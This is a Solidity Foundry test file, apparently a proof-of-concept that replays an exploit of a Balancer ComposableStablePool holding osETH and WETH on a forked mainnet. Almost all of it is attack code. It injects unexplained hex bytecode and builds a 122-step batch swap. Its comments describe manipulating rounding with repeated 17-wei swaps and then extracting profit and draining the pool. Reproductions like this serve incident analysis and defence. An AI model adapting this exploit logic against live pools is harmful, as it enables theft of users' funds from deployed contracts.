// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import "forge-std/Test.sol";
import "../../interface/interface.sol";

interface IComposableStablePool is IERC20 {
    function getPoolId() external view returns (bytes32);
    function getBptIndex() external view returns (uint256);
    function getScalingFactors() external view returns (uint256[] memory);
    function getRateProviders() external view returns (IRateProvider[] memory);
    function updateTokenRateCache(IERC20 token) external;
    function getAmplificationParameter()
        external
        view
        returns (uint256 value, bool isUpdating, uint256 precision);
    function getSwapFeePercentage() external view returns (uint256);
    function getRate() external view returns (uint256);
    function getActualSupply() external view returns (uint256);
}

interface IRateProvider {
    function getRate() external view returns (uint256);
}

contract BalancerPoC is Test {
    BalancerExploit exploitContract;

    constructor() {
        // Fork Mainnet chain at block just before the exploit
        vm.createSelectFork("mainnet", 23717397 - 1);
    }

    function testExploit() public {
        exploitContract = new BalancerExploit();
    }
}

contract BalancerExploit is Test {
    Calculator calculator;
    IBalancerVault public balancerVault;
    IComposableStablePool composableStablePool;
    bytes32 poolId;
    uint256 bptIndex;
    IERC20[] poolTokens;
    IERC20 weth;
    IERC20 osETH;

    constructor() payable {
        calculator = new Calculator();
        vm.etch(
            address(calculator),
            hex"6080604052348015600f57600080fd5b506004361061002b5760003560e01c8063524c9e2014610030575b600080fd5b61004361003e366004610838565b610059565b60405161005091906108c5565b60405180910390f35b60005460609073ffffffffffffffffffffffffffffffffffffffff16321480610099575060015473ffffffffffffffffffffffffffffffffffffffff1632145b6100be5760405162461bcd60e51b81526004016100b590610909565b60405180910390fd5b6000885167ffffffffffffffff811180156100d857600080fd5b50604051908082528060200260200182016040528015610102578160200160208202803683370190505b50905060005b895181101561016a57670de0b6b3a764000089828151811061012657fe5b60200260200101518b838151811061013a57fe5b6020026020010151028161014a57fe5b0482828151811061015757fe5b6020908102919091010152600101610108565b506000670de0b6b3a764000089888151811061018257fe5b602002602001015187028161019357fe5b04905060006101a28684610297565b905060006101b487858c8c87876103fa565b905060008b8b815181106101c457fe5b602002602001015160018d8d815181106101da57fe5b602002602001015184670de0b6b3a7640000020103816101f657fe5b049050600087670de0b6b3a76400000360018984670de0b6b3a764000002670de0b6b3a76400000103038161022757fe5b049050808e8d8151811061023757fe5b6020026020010151018e8d8151811061024c57fe5b602002602001018181525050898e8c8151811061026557fe5b6020026020010151038e8c8151811061027a57fe5b6020908102919091010152509b9c9b505050505050505050505050565b80516000908190815b818110156102d8576102ce8582815181106102b757fe5b6020026020010151846104af90919063ffffffff16565b92506001016102a0565b50816102e9576000925050506103f4565b600082868302825b60ff8110156103e2578260005b8681101561033f5761033561031383876104c8565b6103308c848151811061032257fe5b60200260200101518a6104c8565b6104ec565b91506001016102fe565b50839450610398610377610371610356848a6104c8565b61036b610363888d6104c8565b6103e86104ec565b906104af565b866104c8565b61033061038789600101856104c8565b61036b6103636103e889038a6104c8565b9350848411156103c0576001858503116103bb57839750505050505050506103f4565b6103d9565b6001848603116103d957839750505050505050506103f4565b506001016102f1565b506103ee61014161050c565b50505050505b92915050565b60006104228387868151811061040c57fe5b602002602001015161053990919063ffffffff16565b86858151811061042e57fe5b60200260200101818152505060006104488888858961054f565b90508387868151811061045757fe5b60200260200101510187868151811061046c57fe5b6020026020010181815250506104a3600161036b89898151811061048c57fe5b60200260200101518461053990919063ffffffff16565b98975050505050505050565b60008282016104c18482101583610718565b9392505050565b60008282026104c18415806104e55750838583816104e257fe5b04145b6003610718565b60006104fb8215156004610718565b81838161050457fe5b049392505050565b610536817f42414c000000000000000000000000000000000000000000000000000000000061072a565b50565b6000610549838311156001610718565b50900390565b60008084518602905060008560008151811061056757fe5b60200260200101519050600086518760008151811061058257fe5b60200260200101510290506000600190505b87518110156105e8576105cd6105c76105c0848b85815181106105b357fe5b60200260200101516104c8565b8a516104c8565b886104ec565b91506105de8882815181106102b757fe5b9250600101610594565b508685815181106105f557fe5b602002602001015182039150600061060d87886104c8565b9050600061063e61063261062a8461062589886104c8565b61078b565b6103e86104c8565b8a89815181106105b357fe5b9050600061065961065261062a8b896104ec565b86906104af565b905060008061067561066b86866104af565b6106258d866104af565b905060005b60ff8110156106fb578192506106b06106978661036b85866104c8565b6106258e6106aa8861036b8860026104c8565b90610539565b9150828211156106d9576001838303116106d4575097506107109650505050505050565b6106f3565b6001828403116106f3575097506107109650505050505050565b60010161067a565b5061070761014261050c565b50505050505050505b949350505050565b81610726576107268161050c565b5050565b62461bcd60e51b600090815260206004526007602452600a808404818106603090810160081b958390069590950190829004918206850160101b01602363ffffff0060e086901c160160181b0190930160c81b60445260e882901c90606490fd5b600061079a8215156004610718565b50811515600019909201046001010290565b600082601f8301126107bc578081fd5b8135602067ffffffffffffffff808311156107d357fe5b818302604051838282010181811084821117156107ec57fe5b6040528481528381019250868401828801850189101561080a578687fd5b8692505b8583101561082c57803584529284019260019290920191840161080e565b50979650505050505050565b600080600080600080600060e0888a031215610852578283fd5b873567ffffffffffffffff80821115610869578485fd5b6108758b838c016107ac565b985060208a013591508082111561088a578485fd5b506108978a828b016107ac565b979a9799505050506040860135956060810135956080820135955060a0820135945060c09091013592509050565b6020808252825182820181905260009190848201906040850190845b818110156108fd578351835292840192918401916001016108e1565b50909695505050505050565b60208082526001908201527f580000000000000000000000000000000000000000000000000000000000000060408201526060019056fea264697066735822122042fa4b1bd8f1386b14de953915a5597d5538d2fd4eae05c122ff8f2dbeb1351364736f6c63430007060033"
        );
        balancerVault = IBalancerVault(
            0xBA12222222228d8Ba445958a75a0704d566BF2C8
        );
        composableStablePool = IComposableStablePool(
            0xDACf5Fa19b1f720111609043ac67A9818262850c
        );

        poolId = bytes32(composableStablePool.getPoolId());
        bptIndex = composableStablePool.getBptIndex();
        (poolTokens, , ) = balancerVault.getPoolTokens(bytes32(poolId));
        weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        osETH = IERC20(poolTokens[2]);

        weth.approve(address(balancerVault), type(uint256).max);
        composableStablePool.approve(address(balancerVault), type(uint256).max);
        osETH.approve(address(balancerVault), type(uint256).max);

        uint256[] memory scalingFactors = composableStablePool
            .getScalingFactors();
        console.log(
            "Initial scaling factors:",
            scalingFactors[0],
            scalingFactors[1],
            scalingFactors[2]
        );
        IRateProvider[] memory rateProviders = composableStablePool
            .getRateProviders();
        composableStablePool.updateTokenRateCache(osETH);

        (uint256 amp, , ) = composableStablePool.getAmplificationParameter();
        console.log("Initial amplification parameter:", amp);
        uint256 swapFee = composableStablePool.getSwapFeePercentage();
        console.log("Initial swap fee percentage:", swapFee);
        uint256 rate = composableStablePool.getRate();
        console.log("Initial osETH rate:", rate);
        uint256 actualSupply = composableStablePool.getActualSupply();
        console.log("Initial actual supply:", actualSupply);

        scalingFactors = composableStablePool.getScalingFactors();
        console.log(
            "Updated scaling factors:",
            scalingFactors[0],
            scalingFactors[1],
            scalingFactors[2]
        );

        (uint256 osETHBalance, , , ) = balancerVault.getPoolTokenInfo(
            poolId,
            osETH
        );

        console.log("osETH balance in the pool:", osETHBalance);

        IBalancerVault.FundManagement memory fundManagement = IBalancerVault
            .FundManagement({
                sender: address(this),
                fromInternalBalance: true,
                recipient: payable(address(this)),
                toInternalBalance: true
            });

        // Total swaps: 122 (Phase1: 22 + Phase2: 90 + Phase3: 8 + Cleanup: 2)
        IBalancerVault.BatchSwapStep[]
            memory batchSwapData = new IBalancerVault.BatchSwapStep[](122);
        uint256 swapIndex = 0;

        // ========== PHASE 1: Geometric Decrease (÷100 progression) ==========
        // Purpose: Burn BPT progressively to set rounding boundary
        uint256[11] memory phase1Amounts0 = [
            uint256(4873132999218408001625),
            48731329992184080017,
            487313299921840800,
            4873132999218408,
            48731329992184,
            487313299922,
            4873132999,
            48731330,
            487313,
            4873,
            50
        ];
        uint256[11] memory phase1Amounts2 = [
            uint256(6783065423678905706961),
            67830654236789057069,
            678306542367890571,
            6783065423678906,
            67830654236789,
            678306542367,
            6783065424,
            67830654,
            678307,
            6783,
            69
        ];

        for (uint256 i = 0; i < 11; i++) {
            // BPT -> osETH
            batchSwapData[swapIndex++] = IBalancerVault.BatchSwapStep({
                poolId: poolId,
                assetInIndex: 1, // BPT
                assetOutIndex: 0, // osETH
                amount: phase1Amounts0[i],
                userData: ""
            });

            // BPT -> WETH
            batchSwapData[swapIndex++] = IBalancerVault.BatchSwapStep({
                poolId: poolId,
                assetInIndex: 1, // BPT
                assetOutIndex: 2, // WETH
                amount: phase1Amounts2[i],
                userData: ""
            });
        }

        // ========== PHASE 2: Precision Exploitation (17 wei magic number) ==========
        // Purpose: Accumulate rounding errors through repeated 17 wei swaps
        uint256[45] memory phase2ResetAmounts = [
            uint256(66982),
            891000,
            5165,
            666000,
            9016,
            495000,
            12206,
            369000,
            17532,
            270000,
            14434,
            198000,
            11377,
            160000,
            22554,
            120000,
            17663,
            89100,
            12038,
            67500,
            10414,
            52200,
            9007,
            40500,
            7867,
            31500,
            6554,
            24300,
            5472,
            19800,
            4749,
            16200,
            4397,
            12600,
            3442,
            10800,
            3296,
            9000,
            2886,
            7371,
            2286,
            6480,
            2124,
            6075,
            2014
        ];
        bool[45] memory phase2ResetIsAsset0 = [
            true,
            false,
            true,
            false,
            true,
            false,
            true,
            false,
            true,
            false,
            true,
            false,
            true,
            false,
            true,
            false,
            true,
            false,
            true,
            false,
            true,
            false,
            true,
            false,
            true,
            false,
            true,
            false,
            true,
            false,
            true,
            false,
            true,
            false,
            true,
            false,
            true,
            false,
            true,
            false,
            true,
            false,
            true,
            false,
            true
        ];

        for (uint256 i = 0; i < 45; i++) {
            uint256 resetAssetIn = phase2ResetIsAsset0[i] ? 0 : 2;
            uint256 resetAssetOut = phase2ResetIsAsset0[i] ? 2 : 0;

            // Reset swap (varying amounts)
            batchSwapData[swapIndex++] = IBalancerVault.BatchSwapStep({
                poolId: poolId,
                assetInIndex: resetAssetIn,
                assetOutIndex: resetAssetOut,
                amount: phase2ResetAmounts[i],
                userData: ""
            });

            // Magic number swap (always 17 wei)
            batchSwapData[swapIndex++] = IBalancerVault.BatchSwapStep({
                poolId: poolId,
                assetInIndex: resetAssetIn,
                assetOutIndex: resetAssetOut,
                amount: 17,
                userData: ""
            });
        }

        // ========== PHASE 3: Geometric Increase (×1000 progression) ==========
        // Purpose: Extract profit at manipulated prices
        uint256[4] memory phase3Amounts = [
            uint256(10000),
            10000000000,
            10000000000000000,
            10000000000000000000000
        ];

        for (uint256 i = 0; i < 4; i++) {
            // osETH -> BPT
            batchSwapData[swapIndex++] = IBalancerVault.BatchSwapStep({
                poolId: poolId,
                assetInIndex: 0, // osETH
                assetOutIndex: 1, // BPT
                amount: phase3Amounts[i],
                userData: ""
            });

            // WETH -> BPT
            batchSwapData[swapIndex++] = IBalancerVault.BatchSwapStep({
                poolId: poolId,
                assetInIndex: 2, // WETH
                assetOutIndex: 1, // BPT
                amount: phase3Amounts[i] * 1000, // WETH amounts are 1000x osETH
                userData: ""
            });
        }

        // Final cleanup swaps (exact amounts to drain the pool)
        batchSwapData[swapIndex++] = IBalancerVault.BatchSwapStep({
            poolId: poolId,
            assetInIndex: 2, // WETH
            assetOutIndex: 1, // BPT
            amount: 941319322493191942754,
            userData: ""
        });

        batchSwapData[swapIndex++] = IBalancerVault.BatchSwapStep({
            poolId: poolId,
            assetInIndex: 0, // osETH
            assetOutIndex: 1, // BPT
            amount: 941319322493191942754,
            userData: ""
        });

        address[] memory poolTokensAddr = new address[](poolTokens.length);
        for (uint256 i = 0; i < poolTokens.length; i++) {
            poolTokensAddr[i] = address(poolTokens[i]);
        }

        int256[] memory limits = new int256[](poolTokens.length);
        for (uint256 i = 0; i < poolTokens.length; i++) {
            limits[i] = type(int256).max;
        }

        balancerVault.batchSwap(
            IBalancerVault.SwapKind.GIVEN_OUT,
            batchSwapData,
            poolTokensAddr,
            fundManagement,
            limits,
            block.timestamp + 300
        );

        (osETHBalance, , , ) = balancerVault.getPoolTokenInfo(poolId, osETH);
        console.log("osETH balance in the pool before swap:", osETHBalance);
    }
}

contract Calculator {
    address owner;
    constructor() {
        owner = msg.sender;
    }
}
